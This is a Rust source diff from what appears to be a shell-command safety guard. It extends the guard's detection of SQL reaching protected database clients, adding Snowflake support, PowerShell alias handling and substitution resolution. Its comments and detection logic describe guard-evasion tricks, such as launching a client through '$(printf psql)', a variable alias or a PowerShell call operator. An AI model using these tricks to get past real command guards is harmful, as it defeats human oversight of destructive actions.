+        "mysql" | "mariadb" => Some("database.mysql"),
+        "mongo" | "mongosh" => Some("database.mongodb"),
+        "sqlite3" => Some("database.sqlite"),
+        "snow" => Some("database.snowflake"),
+        _ => None,
+    }
+}
+
+fn is_indirect_database_pack(pack_id: &str) -> bool {
+    matches!(
+        pack_id,
+        "database.redis"
+            | "database.postgresql"
+            | "database.mysql"
+            | "database.mongodb"
+            | "database.sqlite"
+            | "database.snowflake"
+    )
+}
+
+fn protected_database_pack_in_segment(segment: &str) -> Option<&'static str> {
+    command_tokens(segment)
+        .and_then(|(executable, _)| protected_database_pack_for_executable(&executable))
+}
+
+fn protected_database_packs_in_command(command: &str) -> Vec<&'static str> {
+    let mut packs = Vec::new();
+    for (start, end) in command_segment_ranges(command) {
+        let Some(pack_id) = protected_database_pack_in_segment(&command[start..end]) else {
+            continue;
+        };
+        if !packs.contains(&pack_id) {
+            packs.push(pack_id);
+        }
+    }
+    packs
+}
+
+/// Return true only when the bounded substitution view changes a top-level
+/// executable into a protected database client.
+///
+/// Argument substitutions must remain in their original shell-AST form so
+/// `mask_command_substitutions` can associate each body with the exact argv
+/// slot that consumes it. Applying the matching-only view to an ordinary
+/// command such as `psql $(echo app)` loses that role information and turns a
+/// dynamic database name into executable SQL. The view is needed only for the
+/// actual launcher bypass (`$(printf psql) ...`).
+fn substitution_view_introduces_protected_executable(original: &str, view: &str) -> bool {
+    let original_ranges = top_level_segment_ranges(original);
+    let view_ranges = top_level_segment_ranges(view);
+    if original_ranges.len() != view_ranges.len() {
+        return false;
+    }
+
+    original_ranges.iter().zip(view_ranges.iter()).any(
+        |(&(original_start, original_end), &(view_start, view_end))| {
+            let original_pack = command_tokens(&original[original_start..original_end])
+                .and_then(|(executable, _)| protected_database_pack_for_executable(&executable));
+            let view_pack = command_tokens(&view[view_start..view_end])
+                .and_then(|(executable, _)| protected_database_pack_for_executable(&executable));
+            view_pack.is_some() && view_pack != original_pack
+        },
+    )
+}
+
+fn dynamic_substitution_database_packs(command: &str) -> Vec<&'static str> {
+    let mut packs = Vec::new();
+    for (start, end) in command_segment_ranges(command) {
+        let segment = &command[start..end];
+        if !segment.contains(crate::packs::core::git::POSIX_DYNAMIC_QUOTED)
+            && !segment.contains(crate::packs::core::git::POSIX_DYNAMIC_UNQUOTED)
+        {
+            continue;
+        }
+        let Some((executable, _)) = command_tokens(segment) else {
+            continue;
+        };
+        let Some(pack_id) = protected_database_pack_for_executable(&executable) else {
+            continue;
+        };
+        if !packs.contains(&pack_id) {
+            packs.push(pack_id);
+        }
+    }
+    packs
+}
+
+fn literal_substitution_database_packs(
+    command: &str,
+    shell_dialect: ShellDialect,
+) -> Vec<&'static str> {
+    if !matches!(shell_dialect, ShellDialect::Posix | ShellDialect::Unknown) {
+        return Vec::new();
+    }
+    if !command.contains("$(") && !command.contains('`') {
+        return Vec::new();
+    }
+    let Ok(view) = crate::packs::core::git::posix_substitution_view(command) else {
+        return Vec::new();
+    };
+    if view.command == command {
+        return Vec::new();
+    }
+    protected_database_packs_in_command(&view.command)
+}
+
 struct NestedCommandEvaluationContext<'a, 'audit> {
     enabled_keywords: &'a [&'a str],
     compiled_overrides: &'a crate::config::CompiledOverrides,
     heredoc_settings: &'a crate::config::HeredocSettings,
     allow_once_audit: Option<&'a crate::pending_exceptions::AllowOnceAuditConfig<'audit>>,
+    inherited_automated_stdin: bool,
 }
 
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -1946,6 +6702,9 @@ struct IndirectInputFlow {
     pack_id: &'static str,
     source: IndirectInputSource,
     psql_interpolates_variables: bool,
+    snowflake_templating: crate::packs::database::snowflake::SnowflakeTemplating,
+    snowflake_retain_comments: bool,
+    snowflake_local_only: bool,
 }
 
 #[derive(Debug)]
@@ -1960,32 +6719,76 @@ enum RedirectInput {
 fn collect_indirect_input_flows(
     command: &str,
     segment_ranges: &[(usize, usize)],
+    shell_dialect: ShellDialect,
 ) -> Vec<IndirectInputFlow> {
-    collect_indirect_input_flows_at_depth(command, segment_ranges, 0)
+    collect_indirect_input_flows_at_depth(command, segment_ranges, 0, shell_dialect)
 }
 
 fn collect_indirect_input_flows_at_depth(
     command: &str,
     segment_ranges: &[(usize, usize)],
     shell_depth: usize,
+    shell_dialect: ShellDialect,
 ) -> Vec<IndirectInputFlow> {
     if shell_depth > MAX_EMBEDDED_SHELL_DEPTH {
         return vec![unverified_indirect_wildcard(format!(
             "embedded shell nesting exceeds {MAX_EMBEDDED_SHELL_DEPTH} levels"
         ))];
     }
+    if command.len() as u64 > MAX_INDIRECT_INPUT_BYTES {
+        return vec![unverified_indirect_wildcard(format!(
+            "command exceeds the indirect-analysis limit of {MAX_INDIRECT_INPUT_BYTES} bytes"
+        ))];
+    }
+
+    // Resolve only the existing bounded literal-printf subset before looking
+    // for protected consumers. A command substitution can occupy the
+    // executable word itself (`$(printf psql) -f migration.sql`); parsing the
+    // original AST sees only `printf`, so file/stdin flows would otherwise be
+    // lost. If another substitution remains dynamic after the executable is
+    // resolved, emit a pack-specific unverified flow instead of treating its
+    // marker as concrete argv.
+    let substitution_view = matches!(shell_dialect, ShellDialect::Posix | ShellDialect::Unknown)
+        .then(|| crate::packs::core::git::posix_substitution_view(command))
+        .transpose()
+        .ok()
+        .flatten()
+        .filter(|view| {
+            view.command != command
+                && substitution_view_introduces_protected_executable(command, &view.command)
+        });
+    let dynamic_substitution_packs = substitution_view
+        .as_ref()
+        .filter(|view| view.has_dynamic)
+        .map_or_else(Vec::new, |view| {
+            dynamic_substitution_database_packs(&view.command)
+        });
+    let resolved_substitutions = substitution_view;
+    let command_after_substitutions = resolved_substitutions
+        .as_ref()
+        .map_or(command, |view| view.command.as_str());
+    let powershell_view = if shell_dialect == ShellDialect::PowerShell {
+        match powershell_indirect_input_view(command_after_substitutions) {
+            Ok(view) => view,
+            Err(reason) => return vec![unverified_indirect_wildcard(reason)],
+        }
+    } else {
+        None
+    };
+    let command = powershell_view
+        .as_deref()
+        .unwrap_or(command_after_substitutions);
+    let resolved_segment_ranges = (resolved_substitutions.is_some() || powershell_view.is_some())
+        .then(|| command_segment_ranges(command));
+    let segment_ranges = resolved_segment_ranges.as_deref().unwrap_or(segment_ranges);
+
     let has_shell_indirection = command
         .bytes()
         .any(|byte| matches!(byte, b'|' | b'<' | b'`' | b'$' | b'%' | b'!'));
     if !has_shell_indirection && !has_database_cli_hint(command) {
         return Vec::new();
     }
-    if command.len() as u64 > MAX_INDIRECT_INPUT_BYTES {
-        return vec![unverified_indirect_wildcard(format!(
-            "command exceeds the indirect-analysis limit of {MAX_INDIRECT_INPUT_BYTES} bytes"
-        ))];
-    }
-    if has_database_executable_alias(command) {
+    if has_database_executable_alias(command, shell_dialect) {
         return vec![unverified_indirect_wildcard(
             "a database client executable is invoked through a shell variable alias".to_string(),
         )];
@@ -1997,7 +6800,15 @@ fn collect_indirect_input_flows_at_depth(
             "shell syntax could not be parsed for indirect-input analysis".to_string(),
         )];
     }
-    let mut flows = Vec::new();
+    let mut flows = dynamic_substitution_packs
+        .into_iter()
+        .map(|pack_id| {
+            unverified_indirect_pack(
+                pack_id,
+                "a protected database invocation contains a runtime-dependent command substitution",
+            )
+        })
+        .collect();
     collect_indirect_input_flows_from_node(
         ast.root(),
         &mut flows,
@@ -2011,14 +6822,58 @@ fn collect_indirect_input_flows_at_depth(
     flows
 }
 
-fn has_database_executable_alias(command: &str) -> bool {
+fn assigned_database_executable(value: &str) -> bool {
+    let executable = value
+        .rsplit(['/', '\\'])
+        .next()
+        .unwrap_or(value)
+        .to_ascii_lowercase();
+    let executable = executable.strip_suffix(".exe").unwrap_or(&executable);
+    protected_database_pack_for_executable(executable).is_some()
+}
+
+fn posix_declaration_option(builtin: &str, option: &str) -> bool {
+    let Some(flags) = option
+        .strip_prefix('-')
+        .or_else(|| option.strip_prefix('+'))
+        .filter(|flags| !flags.is_empty())
+    else {
+        return false;
+    };
+    let allowed = match builtin {
+        "export" => "fnp",
+        "readonly" => "aAfp",
+        "declare" | "typeset" => "aAfFgilnprtux",
+        _ => return false,
+    };
+    flags.chars().all(|flag| allowed.contains(flag))
+}
+
+fn has_posix_database_executable_alias(command: &str) -> bool {
     let mut aliases = HashMap::new();
     for (start, end) in top_level_segment_ranges(command) {
         let segment = command[start..end].trim();
         let Ok(tokens) = shell_words::split(segment) else {
             continue;
         };
-        let mut token_index = 0usize;
+        let declaration_builtin = tokens.first().filter(|token| {
+            matches!(
+                token.as_str(),
+                "export" | "readonly" | "declare" | "typeset"
+            )
+        });
+        let mut token_index = usize::from(declaration_builtin.is_some());
+        if let Some(builtin) = declaration_builtin {
+            while tokens
+                .get(token_index)
+                .is_some_and(|option| posix_declaration_option(builtin, option))
+            {
+                token_index += 1;
+            }
+            if tokens.get(token_index).is_some_and(|token| token == "--") {
+                token_index += 1;
+            }
+        }
         while let Some(token) = tokens.get(token_index) {
             let Some((name, value)) = token.split_once('=') else {
                 break;
@@ -2033,26 +6888,11 @@ fn has_database_executable_alias(command: &str) -> bool {
             if !valid_name {
                 break;
             }
-            let executable = value
-                .rsplit(['/', '\\'])
-                .next()
-                .unwrap_or(value)
-                .trim_end_matches(".exe")
-                .to_ascii_lowercase();
-            let is_database = matches!(
-                executable.as_str(),
-                "redis-cli"
-                    | "valkey-cli"
-                    | "keydb-cli"
-                    | "psql"
-                    | "mysql"
-                    | "mariadb"
-                    | "mongo"
-                    | "mongosh"
-                    | "sqlite3"
-            );
-            aliases.insert(name.to_string(), is_database);
+            aliases.insert(name.to_string(), assigned_database_executable(value));
             token_index += 1;
+        }
+        if declaration_builtin.is_some() {
+            continue;
         }
         let Some(executable) = tokens.get(token_index) else {
             continue;
@@ -2066,6 +6906,215 @@ fn has_database_executable_alias(command: &str) -> bool {
         }
     }
     false
+}
+
+fn powershell_variable_name(value: &str) -> Option<String> {
+    let value = value.trim().strip_prefix('$')?;
+    let env_scoped = value
+        .get(..4)
+        .is_some_and(|prefix| prefix.eq_ignore_ascii_case("env:"));
+    let name = if env_scoped { value.get(4..)? } else { value };
+    (!name.is_empty()
+        && name
+            .bytes()
+            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'_'))
+    .then(|| {
+        format!(
+            "{}{}",
+            if env_scoped { "env:" } else { "local:" },
+            name.to_ascii_lowercase(),
+        )
+    })
+}
+
+fn powershell_single_quoted_literal(value: &str) -> Option<String> {
+    let body = value.trim().strip_prefix('\'')?.strip_suffix('\'')?;
+    let mut decoded = String::with_capacity(body.len());
+    let mut chars = body.chars();
+    while let Some(ch) = chars.next() {
+        if ch == '\'' {
+            if chars.next() != Some('\'') {
+                return None;
+            }
+            decoded.push('\'');
+        } else {
+            decoded.push(ch);
+        }
+    }
+    Some(decoded)
+}
+
+fn powershell_double_quoted_literal(value: &str) -> Option<String> {
+    let body = value.trim().strip_prefix('"')?.strip_suffix('"')?;
+    (!body.contains('$') && !body.contains('`') && !body.contains("$(")).then(|| body.to_string())
+}
+
+fn powershell_static_assignment_literal(value: &str) -> Option<String> {
+    powershell_single_quoted_literal(value).or_else(|| powershell_double_quoted_literal(value))
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum PowerShellDatabaseInvocationTarget {
+    Protected,
+    ProvenNonDatabase,
+    Unknown,
+}
+
+fn classify_powershell_database_invocation_target(
+    raw_target: &str,
+    aliases: &HashMap<String, Option<bool>>,
+) -> PowerShellDatabaseInvocationTarget {
+    if let Some(name) = powershell_variable_name(raw_target) {
+        return match aliases.get(&name) {
+            Some(Some(true)) => PowerShellDatabaseInvocationTarget::Protected,
+            Some(Some(false)) => PowerShellDatabaseInvocationTarget::ProvenNonDatabase,
+            Some(None) | None => PowerShellDatabaseInvocationTarget::Unknown,
+        };
+    }
+
+    if powershell_alias_word_is_dynamic(raw_target) {
+        return PowerShellDatabaseInvocationTarget::Unknown;
+    }
+    let Some(target) = shell_word_value(raw_target, ShellDialect::PowerShell) else {
+        return PowerShellDatabaseInvocationTarget::Unknown;
+    };
+    if assigned_database_executable(&target) {
+        PowerShellDatabaseInvocationTarget::Protected
+    } else {
+        PowerShellDatabaseInvocationTarget::ProvenNonDatabase
+    }
+}
+
+fn mask_powershell_indirect_input_segment(command: &str, segment: &str, masked: &mut [u8]) {
+    let start = segment.as_ptr() as usize - command.as_ptr() as usize;
+    let range = start..start + segment.len();
+    masked[range.clone()].fill(b' ');
+    let replacement = b"true";
+    let replacement_len = replacement.len().min(range.len());
+    masked[range.start..range.start + replacement_len]
+        .copy_from_slice(&replacement[..replacement_len]);
+}
+
+fn mask_powershell_call_operator(command: &str, segment: &str, masked: &mut [u8]) {
+    let start = segment.as_ptr() as usize - command.as_ptr() as usize;
+    if masked.get(start) == Some(&b'&') {
+        masked[start] = b' ';
+    }
+}
+
+/// Build a Bash-parseable matching view for caller-proven PowerShell without
+/// letting PowerShell assignment/call-operator syntax manufacture a wildcard
+/// indirect-input finding. Known database aliases and unknown call targets
+/// remain fail-closed; only statically proven non-database invocations are
+/// replaced with inert placeholders. The original command remains
+/// authoritative for evaluation output and allowlists.
+fn powershell_indirect_input_view(command: &str) -> Result<Option<String>, String> {
+    let segments = split_top_level_powershell_statements(command).map_err(|()| {
+        "PowerShell syntax cannot be safely segmented for indirect-input analysis".to_string()
+    })?;
+    let mut aliases: HashMap<String, Option<bool>> = HashMap::new();
+    let mut masked = command.as_bytes().to_vec();
+    let mut changed = false;
+
+    for segment in segments {
+        let segment = segment.trim();
+        if let Some((raw_name, raw_value)) = segment.split_once('=')
+            && let Some(name) = powershell_variable_name(raw_name)
+        {
+            let target = powershell_static_assignment_literal(raw_value)
+                .map(|value| assigned_database_executable(&value));
+            aliases.insert(name, target);
+            mask_powershell_indirect_input_segment(command, segment, &mut masked);
+            changed = true;
+            continue;
+        }
+
+        let Some(rest) = segment
+            .strip_prefix('&')
+            .filter(|rest| rest.chars().next().is_some_and(char::is_whitespace))
+            .map(str::trim_start)
+        else {
+            continue;
+        };
+        let Some(raw_target) = first_shell_word(rest) else {
+            return Err("a PowerShell call-operator target is missing or malformed".to_string());
+        };
+        let variable_target = powershell_variable_name(raw_target).is_some();
+        match classify_powershell_database_invocation_target(raw_target, &aliases) {
+            PowerShellDatabaseInvocationTarget::Protected if variable_target => {
+                return Err(
+                    "a protected database client is invoked through a PowerShell call operator"
+                        .to_string(),
+                );
+            }
+            PowerShellDatabaseInvocationTarget::Protected => {
+                mask_powershell_call_operator(command, segment, &mut masked);
+                changed = true;
+            }
+            PowerShellDatabaseInvocationTarget::Unknown => {
+                return Err(
+                    "a PowerShell call-operator target depends on runtime expansion".to_string(),
+                );
+            }
+            PowerShellDatabaseInvocationTarget::ProvenNonDatabase => {
+                mask_powershell_indirect_input_segment(command, segment, &mut masked);
+                changed = true;
+            }
+        }
+    }
+
+    if !changed {
+        return Ok(None);
+    }
+    String::from_utf8(masked)
+        .map(Some)
+        .map_err(|_| "PowerShell indirect-input matching view is not valid UTF-8".to_string())
+}
+
+fn has_powershell_database_executable_alias(command: &str) -> bool {
+    let Ok(segments) = split_top_level_powershell_statements(command) else {
+        return false;
+    };
+    let mut aliases = HashMap::new();
+    for segment in segments {
+        let segment = segment.trim();
+        if let Some((name, value)) = segment.split_once('=') {
+            if let (Some(name), Some(value)) = (
+                powershell_variable_name(name),
+                powershell_static_assignment_literal(value),
+            ) {
+                aliases.insert(name, assigned_database_executable(&value));
+                continue;
+            }
+        }
+
+        let Some(rest) = segment
+            .strip_prefix('&')
+            .filter(|rest| rest.chars().next().is_some_and(char::is_whitespace))
+            .map(str::trim_start)
+        else {
+            continue;
+        };
+        let Some(raw_target) = first_shell_word(rest) else {
+            continue;
+        };
+        let raw_target = raw_target.trim_matches(['\'', '"']);
+        if powershell_variable_name(raw_target)
+            .is_some_and(|name| aliases.get(&name) == Some(&true))
+        {
+            return true;
+        }
+    }
+    false
+}
+
+fn has_database_executable_alias(command: &str, shell_dialect: ShellDialect) -> bool {
+    matches!(shell_dialect, ShellDialect::Posix | ShellDialect::Unknown)
+        && has_posix_database_executable_alias(command)
+        || matches!(
+            shell_dialect,
+            ShellDialect::PowerShell | ShellDialect::Unknown
+        ) && has_powershell_database_executable_alias(command)
 }
 
 fn collect_direct_redirect_flows(command: &str, flows: &mut Vec<IndirectInputFlow>) {
@@ -2105,13 +7154,13 @@ fn collect_inherited_exec_stdin_flows(command: &str, flows: &mut Vec<IndirectInp
             if let Some(pack_id) = protected_consumer_pack(segment) {
                 push_indirect_flow(
                     flows,
-                    IndirectInputFlow {
+                    indirect_flow_for_consumer(
                         pack_id,
-                        source: IndirectInputSource::Unverified(
+                        IndirectInputSource::Unverified(
                             "stdin is inherited from an earlier exec redirect".to_string(),
                         ),
-                        psql_interpolates_variables: pack_id == "database.postgresql",
-                    },
+                        segment,
+                    ),
                 );
             }
         }
@@ -2144,18 +7193,50 @@ fn unverified_indirect_wildcard(reason: String) -> IndirectInputFlow {
         pack_id: "*",
         source: IndirectInputSource::Unverified(reason),
         psql_interpolates_variables: false,
+        snowflake_templating: crate::packs::database::snowflake::SnowflakeTemplating::Enabled,
+        snowflake_retain_comments: false,
+        snowflake_local_only: false,
+    }
+}
+
+fn unverified_indirect_pack(pack_id: &'static str, reason: &str) -> IndirectInputFlow {
+    IndirectInputFlow {
+        pack_id,
+        source: IndirectInputSource::Unverified(reason.to_string()),
+        psql_interpolates_variables: pack_id == "database.postgresql",
+        snowflake_templating: crate::packs::database::snowflake::SnowflakeTemplating::Enabled,
+        snowflake_retain_comments: false,
+        snowflake_local_only: false,
     }
 }
 
 fn indirect_flow_for_consumer(
     pack_id: &'static str,
     source: IndirectInputSource,
-    _consumer: &str,
+    consumer: &str,
 ) -> IndirectInputFlow {
+    let snowflake = (pack_id == "database.snowflake")
+        .then(|| command_tokens(consumer))
+        .flatten()
+        .filter(|(executable, _)| executable == "snow")
+        .map(|(_, args)| {
+            let analysis = crate::packs::database::snowflake::analyze_snow_sql_args(&args);
+            (
+                analysis.templating,
+                analysis.retain_comments,
+                analysis.local_only,
+            )
+        });
     IndirectInputFlow {
         pack_id,
         source,
         psql_interpolates_variables: pack_id == "database.postgresql",
+        snowflake_templating: snowflake.as_ref().map_or(
+            crate::packs::database::snowflake::SnowflakeTemplating::Enabled,
+            |context| context.0,
+        ),
+        snowflake_retain_comments: snowflake.as_ref().is_some_and(|context| context.1),
+        snowflake_local_only: snowflake.is_some_and(|context| context.2),
     }
 }
 
@@ -2244,8 +7325,16 @@ fn collect_indirect_input_flows_from_node<D: Doc>(
         "redirected_statement" => {}
         "command" => {
             let text = node.text().to_string();
-            for flow in command_argument_payloads(&text, segment_ranges.len() > 1) {
-                push_indirect_flow(flows, flow);
+            match command_argument_payloads(&text, segment_ranges.len() > 1) {
+                Ok(argument_flows) => {
+                    for flow in argument_flows {
+                        push_indirect_flow(flows, flow);
+                    }
+                }
+                Err(reason) if has_database_cli_hint(&text) => {
+                    push_indirect_flow(flows, unverified_indirect_wildcard(reason));
+                }
+                Err(_) => {}
             }
             match shell_command_script(&text) {
                 Ok(Some(script)) => {
@@ -2254,6 +7343,7 @@ fn collect_indirect_input_flows_from_node<D: Doc>(
                         &script,
                         &nested_ranges,
                         shell_depth + 1,
+                        ShellDialect::Posix,
                     ) {
                         push_indirect_flow(flows, flow);
                     }
@@ -2303,6 +7393,7 @@ fn has_database_cli_hint(command: &str) -> bool {
         "mongo",
         "mongosh",
         "sqlite3",
+        "snow",
     ]
     .iter()
     .any(|executable| lower.contains(executable))
@@ -2427,7 +7518,7 @@ fn command_tokens(command: &str) -> Option<(String, Vec<String>)> {
 }
 
 fn shell_command_script(command: &str) -> Result<Option<String>, String> {
-    let masked = mask_command_substitutions(command);
+    let masked = mask_command_substitutions(command)?;
     let Some((mut executable, mut args)) = command_tokens(&masked.command) else {
         return Ok(None);
     };
@@ -2556,6 +7647,12 @@ fn pipe_consumer_pack(command: &str) -> Option<&'static str> {
             Some("database.mongodb")
         }
         "sqlite3" if analyze_sqlite_cli_args(&args).reads_stdin_as_code => Some("database.sqlite"),
+        "snow"
+            if crate::packs::database::snowflake::analyze_snow_sql_args(&args)
+                .reads_stdin_as_code =>
+        {
+            Some("database.snowflake")
+        }
         _ => None,
     }
 }
@@ -4188,7 +9285,7 @@ fn windows_variable_expansion_active(command: &str) -> bool {
         || lower.starts_with("cmd.exe /s /c ")
 }
 
-fn render_literal_printf(args: &[String]) -> Option<String> {
+pub(crate) fn render_literal_printf(args: &[String]) -> Option<String> {
     let format = args.first()?;
     let decoded_format = decode_backslash_escapes(format)?;
     let values = &args[1..];
@@ -4409,6 +9506,7 @@ fn evaluate_sed_shell_sources(
     deadline: Option<&Deadline>,
     first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
     nested_command_depth: usize,
+    inherited_automated_stdin: bool,
 ) -> Option<EvaluationResult> {
     let filesystem_enabled = ordered_packs
         .iter()
@@ -4416,7 +9514,7 @@ fn evaluate_sed_shell_sources(
 
     for source in sources {
         if deadline_exceeded(deadline) || remaining_below(deadline, &crate::perf::PATTERN_MATCH) {
-            return Some(EvaluationResult::allowed_due_to_budget());
+            return Some(EvaluationResult::indeterminate_due_to_budget());
         }
 
         match source {
@@ -4432,7 +9530,9 @@ fn evaluate_sed_shell_sources(
                     allow_once_audit,
                     project_path,
                     deadline,
+                    crate::normalize::ShellDialect::Posix,
                     nested_command_depth + 1,
+                    inherited_automated_stdin,
                 );
                 if result.skipped_due_to_budget {
                     return Some(result);
@@ -5098,11 +10198,16 @@ fn first_shell_word(input: &str) -> Option<&str> {
     (index > 0 && !in_single && !in_double).then_some(input)
 }
 
-fn command_argument_payloads(command: &str, compound_command: bool) -> Vec<IndirectInputFlow> {
-    let masked = mask_command_substitutions(command);
+fn command_argument_payloads(
+    command: &str,
+    compound_command: bool,
+) -> Result<Vec<IndirectInputFlow>, String> {
+    let masked = mask_command_substitutions(command)?;
     let Some((executable, args)) = command_tokens(&masked.command) else {
-        return Vec::new();
+        return Ok(Vec::new());
     };
+    let snowflake_analysis = (executable == "snow")
+        .then(|| crate::packs::database::snowflake::analyze_snow_sql_args(&args));
 
     let mut flows = Vec::new();
     for (pack_id, value) in code_argument_slots(&executable, &args) {
@@ -5137,6 +10242,16 @@ fn command_argument_payloads(command: &str, compound_command: bool) -> Vec<Indir
             pack_id,
             source,
             psql_interpolates_variables: false,
+            snowflake_templating: snowflake_analysis.as_ref().map_or(
+                crate::packs::database::snowflake::SnowflakeTemplating::Enabled,
+                |analysis| analysis.templating,
+            ),
+            snowflake_retain_comments: snowflake_analysis
+                .as_ref()
+                .is_some_and(|analysis| analysis.retain_comments),
+            snowflake_local_only: snowflake_analysis
+                .as_ref()
+                .is_some_and(|analysis| analysis.local_only),
         });
     }
     for (pack_id, value) in file_argument_slots(&executable, &args) {
@@ -5172,6 +10287,16 @@ fn command_argument_payloads(command: &str, compound_command: bool) -> Vec<Indir
             pack_id,
             source,
             psql_interpolates_variables: pack_id == "database.postgresql",
+            snowflake_templating: snowflake_analysis.as_ref().map_or(
+                crate::packs::database::snowflake::SnowflakeTemplating::Enabled,
+                |analysis| analysis.templating,
+            ),
+            snowflake_retain_comments: snowflake_analysis
+                .as_ref()
+                .is_some_and(|analysis| analysis.retain_comments),
+            snowflake_local_only: snowflake_analysis
+                .as_ref()
+                .is_some_and(|analysis| analysis.local_only),
         });
     }
     let psql_analysis = (executable == "psql").then(|| analyze_psql_args(&args));
@@ -5219,6 +10344,10 @@ fn command_argument_payloads(command: &str, compound_command: bool) -> Vec<Indir
                 pack_id: "database.postgresql",
                 source,
                 psql_interpolates_variables: true,
+                snowflake_templating:
+                    crate::packs::database::snowflake::SnowflakeTemplating::Enabled,
+                snowflake_retain_comments: false,
+                snowflake_local_only: false,
             });
         }
     }
@@ -5228,7 +10357,8 @@ fn command_argument_payloads(command: &str, compound_command: bool) -> Vec<Indir
             "mysql" | "mariadb" => "database.mysql",
             "mongo" | "mongosh" => "database.mongodb",
             "sqlite3" => "database.sqlite",
-            _ => return flows,
+            "snow" => "database.snowflake",
+            _ => return Ok(flows),
         };
         flows.push(IndirectInputFlow {
             pack_id,
@@ -5237,7 +10367,140 @@ fn command_argument_payloads(command: &str, compound_command: bool) -> Vec<Indir
                     .to_string(),
             ),
             psql_interpolates_variables: pack_id == "database.postgresql",
+            snowflake_templating: snowflake_analysis.as_ref().map_or(
+                crate::packs::database::snowflake::SnowflakeTemplating::Enabled,
+                |analysis| analysis.templating,
+            ),
+            snowflake_retain_comments: snowflake_analysis
+                .as_ref()
+                .is_some_and(|analysis| analysis.retain_comments),
+            snowflake_local_only: snowflake_analysis
+                .as_ref()
+                .is_some_and(|analysis| analysis.local_only),
         });
+    }
+    Ok(flows)
+}
+
+fn collect_dialect_snowflake_flows(
+    command: &str,
+    dialect: ShellDialect,
+    compound_command: bool,
+) -> Vec<IndirectInputFlow> {
+    if crate::packs::database::snowflake::snowflake_cli_exceeds_analysis_budget(command) {
+        return vec![unverified_indirect_pack(
+            "database.snowflake",
+            crate::packs::database::snowflake::OVERSIZED_CLI_REASON,
+        )];
+    }
+
+    let arg_sets = crate::packs::database::snowflake::snow_cli_args_in_dialect(command, dialect);
+    let has_complete_unknown_dialect_parse = dialect == ShellDialect::Unknown
+        && arg_sets.iter().any(|args| {
+            let analysis = crate::packs::database::snowflake::analyze_snow_sql_args(args);
+            analysis.is_sql_command() && analysis.unverified_reason.is_none()
+        });
+    let mut flows = Vec::new();
+    if crate::packs::database::snowflake::dynamic_snowflake_executable_unverified(command, dialect)
+    {
+        push_indirect_flow(
+            &mut flows,
+            IndirectInputFlow {
+                pack_id: "database.snowflake",
+                source: IndirectInputSource::Unverified(
+                    crate::packs::database::snowflake::DYNAMIC_EXECUTABLE_REASON.to_string(),
+                ),
+                psql_interpolates_variables: false,
+                snowflake_templating:
+                    crate::packs::database::snowflake::SnowflakeTemplating::Enabled,
+                snowflake_retain_comments: false,
+                snowflake_local_only: false,
+            },
+        );
+    }
+    for args in arg_sets {
+        let analysis = crate::packs::database::snowflake::analyze_snow_sql_args(&args);
+        // Unknown-dialect recovery intentionally tries POSIX, PowerShell, and
+        // Cmd. A POSIX single-quoted query is also tokenizable as Cmd, where
+        // single quotes are ordinary bytes: the alternate parse sees a
+        // truncated `-q` operand followed by rejected positional arguments.
+        // Do not turn that known-rejected alternate argv into executable SQL
+        // when another dialect parsed the same invocation completely. Other
+        // ambiguity classes still fail closed, and all complete recovered
+        // dialect payloads continue through semantic scanning.
+        if has_complete_unknown_dialect_parse
+            && analysis.unverified_reason
+                == Some(crate::packs::database::snowflake::UNEXPECTED_POSITIONAL_REASON)
+        {
+            continue;
+        }
+        let templating = analysis.templating;
+        let retain_comments = analysis.retain_comments;
+        let local_only = analysis.local_only;
+
+        for value in analysis.query_values {
+            push_indirect_flow(
+                &mut flows,
+                IndirectInputFlow {
+                    pack_id: "database.snowflake",
+                    source: IndirectInputSource::StaticProducer(value.to_string()),
+                    psql_interpolates_variables: false,
+                    snowflake_templating: templating,
+                    snowflake_retain_comments: retain_comments,
+                    snowflake_local_only: local_only,
+                },
+            );
+        }
+        for value in analysis.file_values {
+            let source = if compound_command {
+                IndirectInputSource::Unverified(
+                    "an executable Snowflake file is consumed in a compound command and could be modified after inspection"
+                        .to_string(),
+                )
+            } else {
+                IndirectInputSource::File(PathBuf::from(value))
+            };
+            push_indirect_flow(
+                &mut flows,
+                IndirectInputFlow {
+                    pack_id: "database.snowflake",
+                    source,
+                    psql_interpolates_variables: false,
+                    snowflake_templating: templating,
+                    snowflake_retain_comments: retain_comments,
+                    snowflake_local_only: local_only,
+                },
+            );
+        }
+        if analysis.reads_stdin_as_code {
+            push_indirect_flow(
+                &mut flows,
+                IndirectInputFlow {
+                    pack_id: "database.snowflake",
+                    source: IndirectInputSource::Unverified(
+                        "a shell-obfuscated Snowflake executable reads SQL from stdin whose dialect-specific producer cannot be proven by the generic shell-flow parser"
+                            .to_string(),
+                    ),
+                    psql_interpolates_variables: false,
+                    snowflake_templating: templating,
+                    snowflake_retain_comments: retain_comments,
+                    snowflake_local_only: local_only,
+                },
+            );
+        }
+        if let Some(reason) = analysis.unverified_reason {
+            push_indirect_flow(
+                &mut flows,
+                IndirectInputFlow {
+                    pack_id: "database.snowflake",
+                    source: IndirectInputSource::Unverified(reason.to_string()),
+                    psql_interpolates_variables: false,
+                    snowflake_templating: templating,
+                    snowflake_retain_comments: retain_comments,
+                    snowflake_local_only: local_only,
+                },
+            );
+        }
     }
     flows
 }
@@ -5385,6 +10648,11 @@ fn code_argument_slots<'a>(executable: &str, args: &'a [String]) -> Vec<(&'stati
             .into_iter()
             .map(|value| ("database.sqlite", value))
             .collect(),
+        "snow" => crate::packs::database::snowflake::analyze_snow_sql_args(args)
+            .query_values
+            .into_iter()
+            .map(|value| ("database.snowflake", value))
+            .collect(),
         _ => Vec::new(),
     }
 }
@@ -5416,6 +10684,11 @@ fn file_argument_slots<'a>(executable: &str, args: &'a [String]) -> Vec<(&'stati
             .into_iter()
             .map(|value| ("database.sqlite", value))
             .collect(),
+        "snow" => crate::packs::database::snowflake::analyze_snow_sql_args(args)
+            .file_values
+            .into_iter()
+            .map(|value| ("database.snowflake", value))
+            .collect(),
         _ => Vec::new(),
     }
 }
@@ -5426,6 +10699,9 @@ fn unverified_embedded_file_source(executable: &str, args: &[String]) -> bool {
         "mysql" | "mariadb" => analyze_mysql_cli_args(args).has_unverified_file_source,
         "mongo" | "mongosh" => analyze_mongo_cli_args(args).has_unverified_file_source,
         "sqlite3" => analyze_sqlite_cli_args(args).has_unverified_file_source,
+        "snow" => crate::packs::database::snowflake::analyze_snow_sql_args(args)
+            .unverified_reason
+            .is_some(),
         _ => false,
     }
 }
